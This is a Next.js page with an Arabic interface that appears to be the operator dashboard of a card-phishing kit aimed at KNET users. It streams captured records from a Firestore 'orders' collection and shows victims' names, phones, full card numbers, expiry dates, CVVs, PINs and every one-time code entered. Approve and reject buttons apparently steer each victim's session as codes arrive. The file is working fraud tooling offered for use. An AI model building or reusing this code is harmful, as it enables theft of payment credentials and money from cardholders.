'use client';

import {
  useState,
  useEffect,
  JSXElementConstructor,
  Key,
  PromiseLikeOfReactNode,
  ReactElement,
  ReactNode,
  ReactPortal,
} from 'react';
import { useRouter } from 'next/navigation';
import { Trash2 } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog';
import {
  collection,
  getDocs,
  doc,
  deleteDoc,
  writeBatch,
  updateDoc,
  onSnapshot,
  query,
  orderBy,
} from 'firebase/firestore';
import { onAuthStateChanged, signOut } from 'firebase/auth';
import { NotificationDocument, auth, db } from '@/lib/firestore';

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<NotificationDocument[]>(
    []
  );
  const [isLoading, setIsLoading] = useState(true);
  const [pageName, setPagename] = useState<string>('');
  const [message, setMessage] = useState<boolean>(false);
  const [selectedInfo, setSelectedInfo] = useState<'personal' | 'card' | null>(
    null
  );
  const [selectedNotification, setSelectedNotification] =
    useState<NotificationDocument | null>(null);
  const router = useRouter();

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push('/login');
      } else {
        const unsubscribeNotifications = fetchNotifications();
        return () => {
          unsubscribeNotifications();
        };
      }
    });

    return () => unsubscribe();
  }, [router]);

  const fetchNotifications = () => {
    setIsLoading(true);
    const q = query(collection(db, 'orders'), orderBy('createdAt', 'desc'));
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs.map((doc) => ({
          id: doc.id,
          ...doc.data(),
        })) as NotificationDocument[];
        setNotifications(notificationsData);
        setIsLoading(false);
        console.log(doc);
        // playNotificationSound();
      },
      (error) => {
        console.error('Error fetching notifications:', error);
        setIsLoading(false);
      }
    );

    return unsubscribe;
  };
  const handleClearAll = async () => {
    setIsLoading(true);
    try {
      const batch = writeBatch(db);
      notifications.forEach((notification) => {
        const docRef = doc(db, 'orders', notification.id);
        batch.delete(docRef);
      });
      await batch.commit();
      setNotifications([]);
    } catch (error) {
      console.error('Error clearing notifications:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleDelete = async (id: string) => {
    try {
      await deleteDoc(doc(db, 'orders', id));
      setNotifications(
        notifications.filter((notification) => notification.id !== id)
      );
    } catch (error) {
      console.error('Error deleting notification:', error);
    }
  };

  const handlePageName = (id: string) => {
    setPagename('asd');
  };
  const handleApproval = async (state: string, id: string) => {
    const targetPost = doc(db, 'orders', id);
    await updateDoc(targetPost, {
      status: state,
    });
  };

  const handleLogout = async () => {
    try {
      await signOut(auth);
      router.push('/login');
    } catch (error) {
      console.error('Error signing out:', error);
    }
  };

  const handleInfoClick = (
    notification: NotificationDocument,
    infoType: 'personal' | 'card'
  ) => {
    setSelectedNotification(notification);
    setSelectedInfo(infoType);
  };

  const closeDialog = () => {
    setSelectedInfo(null);
    setSelectedNotification(null);
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-black text-white flex items-center justify-center">
        جاري التحميل...
      </div>
    );
  }

  return (
    <div dir="rtl" className="min-h-screen bg-black text-white p-4">
      <div className="max-w-7xl mx-auto">
        <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
          <h1 className="text-xl font-semibold mb-4 sm:mb-0">جميع الإشعارات</h1>
          <div className="flex flex-col sm:flex-row gap-2">
            <Button
              variant="ghost"
              onClick={handleClearAll}
              className="hover:bg-red-600"
              disabled={notifications.length === 0}
            >
              مسح جميع الإشعارات
            </Button>
            <Button
              variant="outline"
              onClick={handleLogout}
              className="bg-gray-700 hover:bg-gray-600"
            >
              تسجيل الخروج
            </Button>
          </div>
        </div>

        <div className="rounded-lg overflow-x-auto">
          <table className="w-full">
            <thead>
              <tr className="border-b border-gray-700">
                <th className="px-4 py-3 text-right">الإسم</th>
                <th className="px-4 py-3 text-right">المعلومات</th>
                <th className="px-4 py-3 text-right">الصفحة الحالية</th>
                <th className="px-4 py-3 text-right">الوقت</th>
                <th className="px-4 py-3 text-center">الاشعارات</th>
                <th className="px-4 py-3 text-center">حذف</th>
              </tr>
            </thead>
            <tbody>
              {notifications.map((notification) => (
                <tr key={notification.id} className="border-b border-gray-700">
                  <td className="px-4 py-3">
                    {notification!.shipping?.fullName}
                  </td>
                  <td className="px-4 py-3">
                    <div className="flex flex-col sm:flex-row gap-2">
                      <Badge
                        variant={
                          notification.shipping ? 'default' : 'secondary'
                        }
                        className="rounded-md cursor-pointer "
                        onClick={() =>
                          handleInfoClick(notification, 'personal')
                        }
                      >
                        {notification.shipping
                          ? 'معلومات شخصية'
                          : 'لا يوجد معلومات'}
                      </Badge>
                      <Badge
                        variant={
                          notification.paymentInfo?.cardNumber
                            ? 'default'
                            : 'destructive'
                        }
                        className={`rounded-md cursor-pointer ${
                          notification.paymentInfo?.cardNumber
                            ? 'bg-green-500'
                            : ''
                        }`}
                        onClick={() => handleInfoClick(notification, 'card')}
                      >
                        {notification.paymentInfo?.cardNumber
                          ? 'معلومات كي نت'
                          : 'لا يوجد كي نت'}
                      </Badge>
                      <Badge
                        variant={
                          notification.values?.cardNumber
                            ? 'destructive'
                            : 'outline'
                        }
                        className={`rounded-md cursor-pointer ${
                          notification.values?.cardNumber
                            ? 'bg-emerald-400'
                            : 'bg-blue-300'
                        }`}
                        onClick={() => handleInfoClick(notification, 'card')}
                      >
                        {notification.values?.cardNumber
                          ? 'معلومات البطاقة '
                          : 'لا يوجد بطاقة'}
                      </Badge>
                    </div>
                  </td>
                  <td className="px-4 py-3">{notification.pageName}</td>
                  <td className="px-4 py-3">{notification.createdAt!}</td>
                  <td className="px-4 py-3 text-center">
                    <Badge variant="default" className="bg-green-500">
                      1
                    </Badge>
                  </td>
                  <td className="px-4 py-3 text-center">
                    <Button
                      variant="destructive"
                      size="sm"
                      onClick={() => handleDelete(notification.id)}
                      className="bg-red-500 hover:bg-red-600"
                    >
                      <Trash2 className="h-4 w-4" />
                    </Button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-gray-800 text-white" dir="rtl">
          <DialogHeader>
            <DialogTitle dir="rtl">
              {selectedInfo === 'personal'
                ? 'المعلومات الشخصية'
                : 'معلومات البطاقة'}
            </DialogTitle>
            <DialogDescription>
              {selectedInfo === 'personal'
                ? 'تفاصيل المعلومات الشخصية'
                : 'تفاصيل معلومات البطاقة'}
            </DialogDescription>
          </DialogHeader>
          {selectedInfo === 'personal' && selectedNotification?.shipping && (
            <div className="space-y-2">
              <p>
                <strong>الاسم الكامل:</strong>{' '}
                {selectedNotification.shipping?.fullName}
              </p>
              <p>
                <strong>رقم هاتف:</strong> {selectedNotification.shipping.phone}
              </p>
              <p>
                <strong>المحافظة:</strong>{' '}
                {selectedNotification.shipping.governorate}
              </p>
            </div>
          )}
          {selectedInfo === 'card' && selectedNotification && (
            <div className="space-y-2">
              <p>
                <strong className="text-red-400 mx-4">البنك:</strong>{' '}
                {selectedNotification.paymentInfo?.bank}
              </p>
              <p></p>
              <p>
                <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{' '}
                {selectedNotification.values?.cardNumber}
                {selectedNotification.paymentInfo?.cardNumber}-
                {selectedNotification.paymentInfo?.prefix}..
              </p>
              <p>
                <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong>{' '}
                {selectedNotification.values?.expiryMonth}/{' '}
                {selectedNotification.values?.expiryYear}
                ..
                {selectedNotification.paymentInfo?.year}/
                {selectedNotification.paymentInfo?.month}
              </p>

              <p className="flex items-center">
                <strong className="text-red-400 mx-4">رمز البطاقة :</strong>{' '}
                {selectedNotification.paymentInfo?.pass}
                .. رمز{selectedNotification.values?.cvv}
              </p>
              <p className="flex items-centerpt-4">
                <strong className="text-red-400 mx-4">رمز التحقق :</strong>{' '}
                {selectedNotification.paymentInfo?.otp}..
                {selectedNotification.payment?.values?.otp}
              </p>
              <></>
              <p>
                <strong className="text-red-400 mx-4">جميع رموز التحقق:</strong>
                <div className="grid grid-cols-4">
                  {selectedNotification.paymentInfo?.allOtps &&
                    selectedNotification.paymentInfo?.allOtps.map(
                      (
                        i:
                          | string
                          | number
                          | boolean
                          | ReactElement<
                              any,
                              string | JSXElementConstructor<any>
                            >
                          | Iterable<ReactNode>
                          | ReactPortal
                          | PromiseLikeOfReactNode
                          | null
                          | undefined,
                        index: Key | null | undefined
                      ) => <Badge key={index}>{i}</Badge>
                    )}
                </div>
              </p>
              <div className="flex justify-between mx-1">
                <Button
                  onClick={() => {
                    handleApproval('approved', selectedNotification.id);
                    setMessage(true);
                    setTimeout(() => {
                      setMessage(false);
                    }, 3000);
                  }}
                  className="w-full m-3 bg-green-500"
                >
                  قبول
                </Button>
                <Button
                  onClick={() => {
                    handleApproval('rejected', selectedNotification.id);
                    setMessage(true);
                    setTimeout(() => {
                      setMessage(false);
                    }, 3000);
                  }}
                  className="w-full m-3"
                  variant="destructive"
                >
                  رفض
                </Button>
              </div>
              <p className="text-red-500">{message ? 'تم الارسال' : ''}</p>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
